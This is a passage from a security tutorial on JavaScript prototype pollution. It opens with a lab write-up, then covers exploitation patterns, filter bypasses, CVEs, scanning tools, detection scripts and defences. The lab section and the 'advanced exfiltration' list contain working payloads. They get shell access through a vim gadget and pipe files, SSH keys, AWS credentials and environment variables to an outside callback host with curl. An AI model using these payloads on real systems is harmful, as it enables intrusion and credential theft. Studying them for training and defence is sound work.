2. Click "Submit solution" in the lab banner
3. Paste the secret
4. Lab solved! ✅

#### HTTP Requests

**Detection Request (JSON Spaces):**
```http
POST /my-account/change-address HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/json

{
    "address_line_1":"123 Main St",
    "address_line_2":"Apt 4",
    "city":"Portland",
    "postcode":"12345",
    "country":"US",
    "sessionId":"...",
    "__proto__": {
        "json spaces": 10
    }
}
```

**RCE Verification Request:**
```http
POST /my-account/change-address HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/json

{
    "address_line_1":"123 Main St",
    "address_line_2":"Apt 4",
    "city":"Portland",
    "postcode":"12345",
    "country":"US",
    "sessionId":"...",
    "__proto__": {
        "shell": "vim",
        "input": ":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
    }
}
```

**Directory Listing Request:**
```http
POST /my-account/change-address HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/json

{
    "address_line_1":"123 Main St",
    "address_line_2":"Apt 4",
    "city":"Portland",
    "postcode":"12345",
    "country":"US",
    "sessionId":"...",
    "__proto__": {
        "shell": "vim",
        "input": ":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
    }
}
```

**Data Exfiltration Request:**
```http
POST /my-account/change-address HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/json

{
    "address_line_1":"123 Main St",
    "address_line_2":"Apt 4",
    "city":"Portland",
    "postcode":"12345",
    "country":"US",
    "sessionId":"...",
    "__proto__": {
        "shell": "vim",
        "input": ":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
    }
}
```

#### Key Payloads

| Purpose | Payload |
|---------|---------|
| Non-destructive detection | `"__proto__": {"json spaces": 10}` |
| RCE verification | `"__proto__": {"shell": "vim", "input": ":! curl https://COLLAB\n"}` |
| Directory listing | `"__proto__": {"shell": "vim", "input": ":! ls /path \| base64 \| curl -d @- https://COLLAB\n"}` |
| File exfiltration | `"__proto__": {"shell": "vim", "input": ":! cat /path/file \| base64 \| curl -d @- https://COLLAB\n"}` |

#### Vim Shell Injection Technique

**How It Works:**

When Node.js spawns a child process with polluted properties:
```javascript
execSync(command, {
    shell: '/bin/sh',  // Can be polluted to 'vim'
    input: 'data'      // Can be polluted to vim commands
});
```

**Vim Command Syntax:**
- `:!` - Execute shell command from vim
- `\n` - Newline to execute the command
- Commands run in the context of the Node.js process

**Why Base64 Encoding?**
1. Avoids issues with special characters in file contents
2. Ensures proper transmission via HTTP POST
3. Prevents curl from misinterpreting the data
4. Bypasses potential character restrictions

#### Advanced Data Exfiltration Techniques

**Technique 1: Recursive Directory Listing**
```json
"input": ":! find /home/carlos -type f | base64 | curl -d @- https://COLLAB\n"
```

**Technique 2: Environment Variables**
```json
"input": ":! env | base64 | curl -d @- https://COLLAB\n"
```

**Technique 3: Database Credentials**
```json
"input": ":! cat /app/config/database.yml | base64 | curl -d @- https://COLLAB\n"
```

**Technique 4: SSH Keys**
```json
"input": ":! cat /home/carlos/.ssh/id_rsa | base64 | curl -d @- https://COLLAB\n"
```

**Technique 5: AWS Credentials**
```json
"input": ":! cat /home/carlos/.aws/credentials | base64 | curl -d @- https://COLLAB\n"
```

**Technique 6: Process Information**
```json
"input": ":! ps aux | base64 | curl -d @- https://COLLAB\n"
```

**Technique 7: Network Configuration**
```json
"input": ":! ifconfig | base64 | curl -d @- https://COLLAB\n"
```

#### Alternative Exfiltration Methods

**Method 1: DNS Exfiltration (for short data)**
```json
"input": ":! cat /home/carlos/secret | xxd -p | xargs -I {} curl https://{}.YOUR-COLLABORATOR-ID.oastify.com\n"
```

**Method 2: HTTP Header Exfiltration**
```json
"input": ":! curl -H \"X-Data: $(cat /home/carlos/secret | base64)\" https://YOUR-COLLABORATOR-ID.oastify.com\n"
```

**Method 3: Chunked Exfiltration (for large files)**
```bash
# Split into chunks
"input": ":! split -b 1024 /home/carlos/large_file chunk_\n"

# Exfiltrate each chunk
"input": ":! for f in chunk_*; do cat $f | base64 | curl -d @- https://COLLAB/$f; done\n"
```

#### Common Mistakes

1. **Forgetting base64 encoding**: Raw data may contain characters that break the curl command
2. **Not polling Collaborator**: Data is sent to Collaborator; you must poll to retrieve it
3. **Wrong vim syntax**: Must use `:!` for shell commands and end with `\n`
4. **Incorrect path**: File paths are case-sensitive in Linux
5. **Not triggering the gadget**: Must click "Run maintenance jobs" after pollution
6. **Forgetting to decode**: Collaborator data is base64-encoded and must be decoded

#### Troubleshooting

- **No Collaborator callback**: Verify firewall rules, check Collaborator domain spelling
- **Empty data in Collaborator**: Command may have failed; try simpler commands first (e.g., `ls`)
- **Decoding errors**: Ensure you're copying the base64 data correctly, check for line breaks
- **File not found**: Verify the file path with a directory listing first
- **Vim syntax errors**: Test with simple commands like `:! echo test\n` first
- **Encoding issues**: If base64 output looks wrong, try without piping through base64 first

#### Decoding Base64 in Various Environments

**Linux/macOS:**
```bash
echo "BASE64_STRING" | base64 -d
```

**Windows (PowerShell):**
```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_STRING"))
```

**Python:**
```python
import base64
decoded = base64.b64decode("BASE64_STRING").decode('utf-8')
print(decoded)
```

**Online:**
- https://www.base64decode.org/
- https://base64.guru/converter/decode/text

#### Security Implications

**Data at Risk:**
- Application secrets and API keys
- Database credentials
- SSH private keys
- AWS/cloud provider credentials
- User data and PII
- Source code
- Configuration files
- SSL/TLS certificates

**Attack Escalation Path:**
1. Prototype pollution → RCE
2. RCE → File system access
3. File system access → Credential theft
4. Credential theft → Lateral movement
5. Lateral movement → Full compromise

---

## Exploitation Techniques

### Finding Prototype Pollution Sources

#### Client-Side Sources

**1. URL Parameters**
```javascript
// Query string
https://vulnerable.com/?__proto__[foo]=bar

// Hash/Fragment
https://vulnerable.com/#__proto__[foo]=bar
```

**2. JSON Input**
```json
{
    "user": "test",
    "__proto__": {
        "isAdmin": true
    }
}
```

**3. Web Messages (postMessage)**
```javascript
window.postMessage({
    type: "config",
    __proto__: {
        transport_url: "data:,alert(1);"
    }
}, "*");
```

**4. LocalStorage/SessionStorage**
```javascript
localStorage.setItem('config', '{"__proto__":{"foo":"bar"}}');
```

#### Server-Side Sources

**1. JSON Request Bodies**
```http
POST /api/update HTTP/1.1
Content-Type: application/json

{
    "username": "test",
    "__proto__": {
        "isAdmin": true
    }
}
```

**2. URL Parameters (parsed by qs/query-string libraries)**
```
POST /update?__proto__[isAdmin]=true
```

**3. HTTP Headers (in some frameworks)**
```http
X-Custom-Config: {"__proto__":{"role":"admin"}}
```

### Finding Gadgets

#### Manual Gadget Discovery

**Step 1: Identify Undefined Properties**

Look for code that accesses properties without defining them:
```javascript
// Vulnerable pattern
if (config.isAdmin) {
    // admin functionality
}

// config.isAdmin was never explicitly set
// It can be inherited from Object.prototype if polluted
```

**Step 2: Trace Property Access to Sinks**

Common sinks include:
- `eval()`
- `Function()`
- `setTimeout()` / `setInterval()`
- `document.write()`
- `innerHTML`
- `element.setAttribute()`
- `script.src`
- `location.href`

**Step 3: Test Exploitation Chain**

```javascript
// 1. Pollute prototype
?__proto__[transport_url]=data:,alert(1);

// 2. Code accesses undefined property
let url = config.transport_url || '/default.js';

// 3. Property reaches sink
script.src = url; // XSS!
```

#### Automated Gadget Discovery

**Using DOM Invader (Client-Side):**
1. Enable prototype pollution scanning in Burp
2. Browse the application
3. Click "Scan for gadgets"
4. DOM Invader identifies exploitable property chains

**Using Server-Side PP Scanner (Server-Side):**
1. Install "Server-Side Prototype Pollution Scanner" Burp extension
2. Scan proxy history
3. Review identified pollution points and gadgets

### Exploitation Patterns

#### Pattern 1: Property Injection for XSS

**Target Code:**
```javascript
let config = parseQueryString(location.search);
let analytics = document.createElement('script');
analytics.src = config.url || '/analytics.js';
document.body.appendChild(analytics);
```

**Exploit:**
```
?__proto__[url]=data:,alert(document.domain);
```

#### Pattern 2: Privilege Escalation

**Target Code (Server-Side):**
```javascript
function isAdmin(user) {
    return user.isAdmin === true;
}
```

**Exploit:**
```json
{
    "username": "attacker",
    "__proto__": {
        "isAdmin": true
    }
}
```

#### Pattern 3: Remote Code Execution (Node.js)

**Target Code:**
```javascript
const { fork } = require('child_process');
const child = fork('worker.js', [], {
    execArgv: process.execArgv
});
```

**Exploit:**
```json
{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').exec('malicious_command')"
        ]
    }
}
```

#### Pattern 4: Bypass Security Controls

**Target Code:**
```javascript
function sanitizeInput(input) {
    if (input.isSecure) {
        return input.value; // Skip sanitization
    }
    return escapeHtml(input.value);
}
```

**Exploit:**
```json
{
    "value": "<img src=x onerror=alert(1)>",
    "__proto__": {
        "isSecure": true
    }
}
```

### Alternative Prototype Access Methods

#### Method 1: Constructor Property

Instead of `__proto__`:
```javascript
// Using constructor
myObject.constructor.prototype.isAdmin = true;

// In URLs/JSON
?constructor[prototype][isAdmin]=true

{
    "constructor": {
        "prototype": {
            "isAdmin": true
        }
    }
}
```

#### Method 2: Bypassing Sanitization

**Scenario**: Application blocks `__proto__` string

**Bypass Techniques:**

**Technique 1: Non-Recursive Filtering**
```
?__pro__proto__to__[foo]=bar
// After single-pass filtering: __proto__[foo]=bar
```

**Technique 2: Unicode Encoding**
```
?__proto\_\u005f[foo]=bar
// Decodes to: __proto__[foo]=bar
```

**Technique 3: Case Variation (if case-insensitive)**
```
?__PROTO__[foo]=bar
?__Proto__[foo]=bar
```

**Technique 4: Constructor Alternative**
```
?constructor[prototype][foo]=bar
// Achieves same result as __proto__
```

### Real-World Attack Scenarios

#### Scenario 1: E-Commerce Privilege Escalation

**Context**: Online store with user accounts

**Attack Flow:**
1. Create normal user account
2. Identify address update endpoint accepts JSON
3. Test for prototype pollution
4. Pollute `isAdmin` or `discountRate` property
5. Access admin panel or apply unauthorized discounts

**Payload:**
```json
{
    "address": "123 Main St",
    "__proto__": {
        "isAdmin": true,
        "discountRate": 1.0
    }
}
```

#### Scenario 2: SaaS Application Data Breach

**Context**: Multi-tenant SaaS platform

**Attack Flow:**
1. Identify prototype pollution in configuration endpoint
2. Pollute properties that control data access
3. Access data from other tenants

**Payload:**
```json
{
    "settings": {...},
    "__proto__": {
        "tenantId": "victim-tenant-id",
        "bypassIsolation": true
    }
}
```

#### Scenario 3: API Gateway Bypass

**Context**: API with rate limiting and authentication

**Attack Flow:**
1. Find prototype pollution in request parsing
2. Pollute properties that control security checks
3. Bypass rate limiting and authentication

**Payload:**
```json
{
    "query": "...",
    "__proto__": {
        "isAuthenticated": true,
        "rateLimit": false,
        "apiKey": "valid-key"
    }
}
```

#### Scenario 4: Supply Chain Attack

**Context**: npm package with prototype pollution vulnerability

**Attack Flow:**
1. Identify widely-used library with PP vulnerability
2. Craft malicious input that pollutes prototypes
3. Trigger gadgets in downstream applications
4. Achieve RCE or data exfiltration across many applications

**Example:**
```javascript
// Vulnerable library (lodash merge, for example)
const merge = require('lodash.merge');
let config = {};
merge(config, userInput);

// Attacker input
userInput = {
    "__proto__": {
        "execArgv": ["--eval=malicious"]
    }
};
```

---

## Detection Methods

### Client-Side Detection

#### Method 1: Manual Console Testing

**Basic Detection:**
```javascript
// 1. Navigate to: /?__proto__[testProperty]=testValue

// 2. Open console and check:
Object.prototype

// 3. Look for testProperty
// If present, pollution is confirmed
```

**Advanced Detection:**
```javascript
// Test multiple vectors
const tests = [
    '?__proto__[test1]=value1',
    '#__proto__[test2]=value2',
    '?constructor[prototype][test3]=value3'
];

// Check results
console.log(Object.prototype.test1); // "value1" if vulnerable
console.log(Object.prototype.test2); // "value2" if vulnerable
console.log(Object.prototype.test3); // "value3" if vulnerable
```

#### Method 2: DOM Invader (Automated)

**Setup:**
1. Open Burp Suite's built-in browser
2. Navigate to **DOM Invader** settings
3. Enable **Prototype pollution** scanning
4. Browse the target application

**Detection:**
- DOM Invader automatically tests query strings, hash fragments, and postMessage
- Identified pollution sources are highlighted
- Click **Scan for gadgets** for exploitation paths

#### Method 3: Detection Script

**Automated Detection Script:**
```javascript
(function() {
    const testProperty = 'ppDetection_' + Math.random();
    const testValue = 'vulnerable';

    // Test query string
    const url = new URL(window.location.href);
    url.searchParams.set(`__proto__[${testProperty}]`, testValue);

    // Check if pollution occurred
    setTimeout(() => {
        if (Object.prototype[testProperty] === testValue) {
            console.warn('[PP DETECTED] Prototype pollution via query string!');
            console.warn('Polluted property:', testProperty);
            delete Object.prototype[testProperty];
        }
    }, 100);

    // Test hash
    const hash = `#__proto__[${testProperty}2]=${testValue}`;
    if (Object.prototype[testProperty + '2'] === testValue) {
        console.warn('[PP DETECTED] Prototype pollution via hash!');
        delete Object.prototype[testProperty + '2'];
    }
})();
```

### Server-Side Detection

#### Method 1: Property Reflection

**Test for reflected properties:**

**Request:**
```http
POST /api/user/update HTTP/1.1
Content-Type: application/json

{
    "name": "Test User",
    "__proto__": {
        "polluted": "value"
    }
}
```

**Check Response:**
```json
{
    "name": "Test User",
    "polluted": "value"  // ← Reflected without explicit declaration
}
```

If `polluted` appears in the response without being explicitly set, prototype pollution is confirmed.

#### Method 2: Status Code Override

**Exploit http-errors Module:**

**Request:**
```http
POST /api/update HTTP/1.1
Content-Type: application/json

{
    "data": "...",
    "__proto__": {
        "status": 555
    }
}
```

**Check Response:**
```http
HTTP/1.1 555 Custom Status
```

If a custom status code (400-599) appears in responses, pollution is confirmed.

#### Method 3: JSON Spaces Override

**Non-Destructive Detection:**

**Request:**
```http
POST /api/update HTTP/1.1
Content-Type: application/json

{
    "data": "...",
    "__proto__": {
        "json spaces": 10
    }
}
```

**Check Response (Raw Tab):**
```json
{
          "status": "success",
          "data": {...}
}
```

Increased indentation confirms pollution.

#### Method 4: Charset Override (body-parser)

**Exploit body-parser Module:**

**Request:**
```http
POST /api/update HTTP/1.1
Content-Type: application/json

{
    "data": "...",
    "__proto__": {
        "content-type": "application/json; charset=utf-7"
    }
}
```

**Check if UTF-7 Encoding Applied:**
- Send ASCII that encodes differently in UTF-7
- Check if response reflects UTF-7 interpretation

#### Method 5: Burp Extension (Automated)

**Server-Side Prototype Pollution Scanner:**

1. Install "Server-Side Prototype Pollution Scanner" from BApp Store
2. Configure detection methods (status code, JSON spaces, etc.)
3. Right-click requests in Proxy history
4. Select **Extensions → Server-Side PP Scanner → Scan**
5. Review findings in extension output

### Gadget Detection

#### Client-Side Gadget Discovery

**Manual Method:**
1. Pollute `Object.prototype` with test property
2. Open Sources tab in DevTools
3. Search for undefined property access patterns:
   ```javascript
   // Search for: config.
   // Look for: properties accessed but never defined
   ```
4. Set breakpoints and trace execution
5. Identify if properties reach dangerous sinks

**DOM Invader Method:**
1. Confirm pollution source
2. Click **Scan for gadgets**
3. DOM Invader traces property access to sinks
4. Generates proof-of-concept exploits automatically

#### Server-Side Gadget Discovery

**Technique 1: Code Review**

Look for patterns like:
```javascript
// Dangerous pattern
if (options.isAdmin) {
    grantAdminAccess();
}

// options.isAdmin never explicitly set
// Can be inherited from polluted prototype
```

**Technique 2: Black-Box Testing**

1. Pollute various properties:
   ```json
   {
       "__proto__": {
           "isAdmin": true,
           "role": "admin",
           "privilegeLevel": 999,
           "bypassAuth": true
       }
   }
   ```

2. Test application behavior:
   - Can you access admin panels?
   - Are authorization checks bypassed?
   - Do elevated privileges apply?

**Technique 3: Dasty Tool (Automated)**

Research tool for identifying gadget chains in Node.js applications:
- Uses dynamic taint analysis
- Tracks data flow from pollution to sinks
- Identifies exploitable chains automatically

---

## Real-World CVEs

### CVE-2025-55182 & CVE-2025-66478: React2Shell

**Severity**: CRITICAL (CVSS 10.0)
**Disclosure Date**: December 3, 2025
**Affected**: React Server Components, Next.js

#### Technical Details

**Vulnerability Description:**
React's server-side deserialization logic in ReactFlightReplyServer.js expands object properties without sufficient validation. Attackers can insert malicious keys like `__proto__` or `constructor` during the deserialization process, leading to prototype pollution and arbitrary code execution.

**Attack Vector:**
The vulnerability exploits React Flight's `reviveModel` function, which processes data sent from client to server. By manipulating the serialized format, attackers can:
1. Achieve prototype pollution on the server
2. Access the `Function` constructor via prototype chain traversal
3. Execute arbitrary JavaScript code in the server process context

**Exploitation:**
```javascript
// Simplified exploit concept
{
    "type": "server-action",
    "constructor": {
        "prototype": {
            "constructor": ["return process.mainModule.require('child_process').execSync('malicious_command')"]
        }
    }
}
```

**Real-World Impact:**
- React: 1.97 billion total downloads, 20+ million weekly downloads
- Used by 82% of JavaScript developers (2024 survey)
- 145+ proof-of-concept exploits identified within 24 hours
- Mass scanning of vulnerable React applications observed

**Affected Versions:**
- React versions with Server Components
- Next.js versions using Server Actions

**Remediation:**
- Update to patched React versions immediately
- Validate all server-side input rigorously
- Implement input sanitization for `__proto__` and `constructor`

**References:**
- [Datadog Security Labs Analysis](https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/)
- [Picus Security Explanation](https://www.picussecurity.com/resource/blog/react-flight-protocol-rce-vulnerability-cve-2025-55182-and-cve-2025-66478-explained)
- [OX Security Deep Dive](https://www.ox.security/blog/react2shell-going-granular-a-deep-deep-deep-technical-analysis-of-cve-2025-55182/)

---

### CVE-2024-21505: web3-utils Prototype Pollution

**Severity**: HIGH
**Date**: 2024
**Affected**: web3-utils library

#### Technical Details

**Vulnerability Description:**
The web3-utils package is vulnerable to prototype pollution, allowing attackers to inject properties into `Object.prototype`. This was part of the "Shai-Hulud supply chain attack" in September 2025.

**Attack Vector:**
Unsafe object merging in web3-utils functions allows:
```javascript
// Vulnerable code pattern
const merge = require('web3-utils').merge;
merge(target, userInput);

// Malicious input
userInput = {
    "__proto__": {
        "isAdmin": true
    }
};
```

**Impact:**
- Prototype pollution in web3 applications
- Potential for privilege escalation
- Supply chain implications (many dependent packages)

**Remediation:**
- Update web3-utils to patched version
- Implement input validation before object operations
- Use `Object.create(null)` for configuration objects

**References:**
- [Snyk Advisory](https://security.snyk.io/vuln/SNYK-JS-WEB3UTILS-6229337)

---

### Historic Prototype Pollution CVEs

#### CVE-2019-11358: jQuery Prototype Pollution

**Severity**: MEDIUM
**Affected**: jQuery < 3.4.0

**Details:**
```javascript
// Vulnerable code
jQuery.extend(true, {}, userInput);

// Exploit
userInput = {
    "__proto__": {
        "isAdmin": true
    }
};
```

**Impact**: DOM-based XSS, privilege escalation in jQuery-dependent applications

---

#### CVE-2020-7598: minimist Prototype Pollution

**Severity**: HIGH
**Affected**: minimist < 1.2.2

**Details:**
Argument parsing library vulnerable to prototype pollution via command-line arguments:
```bash
node app.js --__proto__.isAdmin=true
```

**Impact**: Server-side prototype pollution in Node.js CLI applications

---

#### CVE-2021-23343: path-parse Prototype Pollution

**Severity**: HIGH
**Affected**: path-parse < 1.0.7

**Details:**
Path parsing allows prototype pollution:
```javascript
const pathParse = require('path-parse');
pathParse('/__proto__/polluted');
```

**Impact**: Affects any application using path-parse for file path processing

---

### Notable Security Research

#### James Kettle's Prototype Pollution Research

**Server-Side Prototype Pollution: Black-box Detection Without the DoS (2022)**
- Developed non-destructive detection techniques
- Identified status code override method
- JSON spaces technique for safe detection
- [PortSwigger Research](https://portswigger.net/research/server-side-prototype-pollution)

**Key Contributions:**
- Standardized detection methodology
- Developed Burp Suite extensions
- Bug bounties: $60,000+ from prototype pollution findings

---

### Supply Chain Implications

**Shai-Hulud Attack (2025):**
- Targeted npm packages with prototype pollution
- Compromised web3-utils and other dependencies
- Demonstrated supply chain risk amplification
- Affected thousands of downstream applications

**Mitigation Strategies:**
1. Regular dependency audits
2. Use `npm audit` and similar tools
3. Implement software composition analysis (SCA)
4. Pin dependency versions
5. Monitor security advisories

---

## Tools and Automation

### Burp Suite Tools

#### 1. DOM Invader (Client-Side)

**Features:**
- Automatic prototype pollution source detection
- Gadget chain discovery
- One-click exploit generation
- Query string, hash, and postMessage testing

**Usage:**
1. Enable DOM Invader in Burp's browser
2. Navigate to target application
3. Enable "Prototype pollution" in settings
4. Browse normally - DOM Invader tests automatically
5. Click "Scan for gadgets" when pollution is found
6. Review and execute generated exploits

**Keyboard Shortcuts:**
- `Ctrl+Shift+I` - Open DOM Invader
- `Ctrl+Shift+G` - Scan for gadgets

---

#### 2. Server-Side Prototype Pollution Scanner

**BApp Store Extension**

**Features:**
- Multiple detection techniques (status code, JSON spaces, charset)
- Batch scanning of proxy history
- Low false-positive rate
- Safe, non-destructive detection

**Usage:**
1. Install from BApp Store
2. Configure detection methods in extension settings
3. Right-click request in Proxy history
4. Select **Extensions → Server-Side PP Scanner → Scan**
5. Review findings in extension output tab

**Configuration Options:**
- Enable/disable specific detection methods
- Set custom test properties
- Configure timeout values
- Adjust sensitivity

---

#### 3. Prototype Pollution Gadgets Finder

**BApp Store Extension by Doyensec**

**Features:**
- Server-side gadget chain identification
- Dynamic taint analysis integration
- Gadget database with known chains
- Automatic exploit generation

**Usage:**
1. Install extension
2. Identify pollution source manually or via scanner
3. Right-click request
4. Select **Gadgets Finder → Analyze**
5. Review identified gadget chains
6. Test exploitation paths

**References:**
- [Doyensec Blog](https://blog.doyensec.com/2024/02/17/server-side-prototype-pollution-Gadgets-scanner.html)
- [PortSwigger BApp Store](https://portswigger.net/bappstore/fcbc58b33fc1486d9a795dedba2ccbbb)

---

### Standalone Tools

#### 1. PPScan (Browser Extension)

**Features:**
- Automatic page scanning for client-side PP
- Real-time detection during browsing
- Visual indicators for vulnerable inputs
- Export findings for further analysis

**Installation:**
- Available for Chrome and Firefox
- Install from browser extension store

**Usage:**
- Install extension
- Browse target application
- Extension highlights vulnerable inputs
- Click icon to view detailed findings

---

#### 2. ppmap (CLI Tool)

**Features:**
- Command-line prototype pollution scanner
- Supports multiple input vectors
- Gadget enumeration
- CI/CD integration

**Installation:**
```bash
npm install -g ppmap
```

**Usage:**
```bash
# Scan URL for client-side PP
ppmap scan https://target.com

# Test specific parameter
ppmap test https://target.com/?param=value

# Enumerate gadgets
ppmap gadgets https://target.com
```

---

#### 3. ppfuzz (Fuzzing Tool)

**Features:**
- Automated fuzzing for prototype pollution
- Multiple payload templates
- Custom payload generation
- Integration with ffuf and other fuzzers

**Usage:**
```bash
# Basic fuzzing
ppfuzz -u https://target.com/?FUZZ

# Custom payloads
ppfuzz -u https://target.com/?FUZZ -w custom_payloads.txt

# POST data fuzzing
ppfuzz -u https://target.com/api -d '{"FUZZ":"value"}' -H "Content-Type: application/json"
```

---

#### 4. Dasty (Research Tool)

**Features:**
- Semi-automated gadget identification pipeline
- Dynamic taint analysis with AST instrumentation
- Targets Node.js applications
- Supply chain gadget discovery

**Functionality:**
- Analyzes application dependencies
- Traces data flow from pollution sources
- Identifies exploitable gadget chains
- Generates proof-of-concept exploits

**Research Paper:**
- "Unveiling the Invisible: Detection and Evaluation of Prototype Pollution Gadgets with Dynamic Taint Analysis"
- [arXiv:2311.03919](https://arxiv.org/abs/2311.03919)
- [ACM Web Conference 2024](https://dl.acm.org/doi/10.1145/3589334.3645579)

---

### Custom Detection Scripts

#### Client-Side Detection Script

```javascript
/**
 * Prototype Pollution Detection Script
 * Run in browser console
 */
(function() {
    console.log('[PP Detector] Starting prototype pollution scan...');

    const testId = 'pptest_' + Date.now();
    const vectors = [
        {
            name: 'Query String',
            test: () => {
                const url = new URL(window.location.href);
                url.searchParams.set(`__proto__[${testId}]`, 'vulnerable');
                window.history.pushState({}, '', url);
                return Object.prototype[testId] === 'vulnerable';
            }
        },
        {
            name: 'Hash Fragment',
            test: () => {
                window.location.hash = `#__proto__[${testId}2]=vulnerable`;
                return Object.prototype[testId + '2'] === 'vulnerable';
            }
        },
        {
            name: 'Constructor',
            test: () => {
                const url = new URL(window.location.href);
                url.searchParams.set(`constructor[prototype][${testId}3]`, 'vulnerable');
                window.history.pushState({}, '', url);
                return Object.prototype[testId + '3'] === 'vulnerable';
            }
        }
    ];

    const results = [];
    vectors.forEach(vector => {
        try {
            if (vector.test()) {
                console.warn(`[VULNERABLE] ${vector.name} allows prototype pollution!`);
                results.push(vector.name);
            } else {
                console.log(`[SAFE] ${vector.name} is not vulnerable`);
            }
        } catch(e) {
            console.error(`[ERROR] Testing ${vector.name}:`, e);
        }
    });

    // Cleanup
    delete Object.prototype[testId];
    delete Object.prototype[testId + '2'];
    delete Object.prototype[testId + '3'];

    if (results.length > 0) {
        console.warn('[SUMMARY] Prototype pollution detected via:', results.join(', '));
    } else {
        console.log('[SUMMARY] No prototype pollution detected');
    }
})();
```

---

#### Server-Side Detection Script (Python)

```python
#!/usr/bin/env python3
"""
Server-Side Prototype Pollution Scanner
Tests for prototype pollution via multiple detection methods
"""

import requests
import json
import sys

def test_json_spaces(url, endpoint):
    """Test for prototype pollution using JSON spaces technique"""
    print(f"[*] Testing JSON spaces method on {url}{endpoint}")

    payload = {
        "test": "data",
        "__proto__": {
            "json spaces": 10
        }
    }

    try:
        response = requests.post(f"{url}{endpoint}", json=payload)

        # Check for increased indentation
        if response.text.count('\n') > 5 and '          ' in response.text:
            print("[!] VULNERABLE - JSON spaces pollution detected!")
            return True
        else:
            print("[*] Not vulnerable to JSON spaces method")
            return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def test_status_code(url, endpoint):
    """Test for prototype pollution using status code override"""
    print(f"[*] Testing status code method on {url}{endpoint}")

    payload = {
        "test": "data",
        "__proto__": {
            "status": 555
        }
    }

    try:
        response = requests.post(f"{url}{endpoint}", json=payload)

        if response.status_code == 555:
            print("[!] VULNERABLE - Status code pollution detected!")
            return True
        else:
            print("[*] Not vulnerable to status code method")
            return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def test_property_reflection(url, endpoint):
    """Test for prototype pollution using property reflection"""
    print(f"[*] Testing property reflection method on {url}{endpoint}")

    test_property = "pptest_" + str(hash(url))[-6:]
    payload = {
        "test": "data",
        "__proto__": {
            test_property: "vulnerable"
        }
    }

    try:
        response = requests.post(f"{url}{endpoint}", json=payload)
        response_data = response.json()

        if test_property in response_data and response_data[test_property] == "vulnerable":
            print(f"[!] VULNERABLE - Property reflection detected! Property: {test_property}")
            return True
        else:
            print("[*] Not vulnerable to property reflection method")
            return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 pp_scanner.py <base_url> <endpoint>")
        print("Example: python3 pp_scanner.py https://example.com /api/update")
        sys.exit(1)

    base_url = sys.argv[1].rstrip('/')
    endpoint = sys.argv[2]

    print(f"\n[*] Starting Server-Side Prototype Pollution Scan")
    print(f"[*] Target: {base_url}{endpoint}\n")

    results = []

    if test_json_spaces(base_url, endpoint):
        results.append("JSON Spaces")

    if test_status_code(base_url, endpoint):
        results.append("Status Code")

    if test_property_reflection(base_url, endpoint):
        results.append("Property Reflection")

    print("\n" + "="*60)
    if results:
        print("[!] PROTOTYPE POLLUTION DETECTED!")
        print(f"[!] Vulnerable methods: {', '.join(results)}")
    else:
        print("[*] No prototype pollution detected")
    print("="*60 + "\n")

if __name__ == "__main__":
    main()
```

**Usage:**
```bash
chmod +x pp_scanner.py
./pp_scanner.py https://target.com /api/update
```

---

### Testing with cURL

#### Client-Side PP Test

```bash
# Test query string
curl "https://target.com/?__proto__[test]=value"

# Test with browser to check console
# Open DevTools and check Object.prototype
```

#### Server-Side PP Tests

**JSON Spaces Method:**
```bash
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{
    "data": "test",
    "__proto__": {
      "json spaces": 10
    }
  }' | grep -A 5 "success"

# Look for increased indentation
```

**Status Code Method:**
```bash
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -w "\nStatus Code: %{http_code}\n" \
  -d '{
    "data": "test",
    "__proto__": {
      "status": 555
    }
  }'

# Check if status code is 555
```

**Property Reflection Method:**
```bash
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{
    "data": "test",
    "__proto__": {
      "testProperty": "vulnerable"
    }
  }' | jq '.'

# Check if testProperty appears in response
```

---

## Prevention and Defense

### Secure Coding Practices

#### 1. Sanitize Property Keys

**Blocklist Approach (Less Secure):**
```javascript
function isPrototypePollutionKey(key) {
    return ['__proto__', 'constructor', 'prototype'].includes(key);
}

function safeMerge(target, source) {
    for (let key in source) {
        if (source.hasOwnProperty(key) && !isPrototypePollutionKey(key)) {
            target[key] = source[key];
        }
    }
}
```

**Allowlist Approach (More Secure):**
```javascript
const ALLOWED_KEYS = ['name', 'email', 'address', 'city', 'postcode'];

function safeMerge(target, source) {
    for (let key of ALLOWED_KEYS) {
        if (source.hasOwnProperty(key)) {
            target[key] = source[key];
        }
    }
}
```

---

#### 2. Freeze Prototype Objects

**Complete Protection:**
```javascript
// Freeze Object.prototype
Object.freeze(Object.prototype);

// Freeze Array.prototype
Object.freeze(Array.prototype);

// Freeze Function.prototype
Object.freeze(Function.prototype);
```

**Considerations:**
- Prevents all modifications to prototypes
- May break legitimate functionality
- Must be done before any other code runs
- Cannot be undone

**Seal Alternative (Less Restrictive):**
```javascript
// Seal prevents new properties but allows value changes
Object.seal(Object.prototype);
```

---

#### 3. Use Objects Without Prototypes

**Create Null-Prototype Objects:**
```javascript
// Instead of:
let config = {};

// Use:
let config = Object.create(null);

// config has no prototype chain
// Cannot inherit polluted properties
```

**Safe Configuration Object:**
```javascript
function createSafeConfig(defaults) {
    const config = Object.create(null);
    Object.assign(config, defaults);
    return config;
}

// Usage
const config = createSafeConfig({
    apiUrl: '/api',
    timeout: 5000
});
```

---

#### 4. Use Map and Set

**Safer Alternatives to Objects:**
```javascript
// Instead of object for key-value storage:
let data = {};

// Use Map:
let data = new Map();

// Map methods only access direct properties
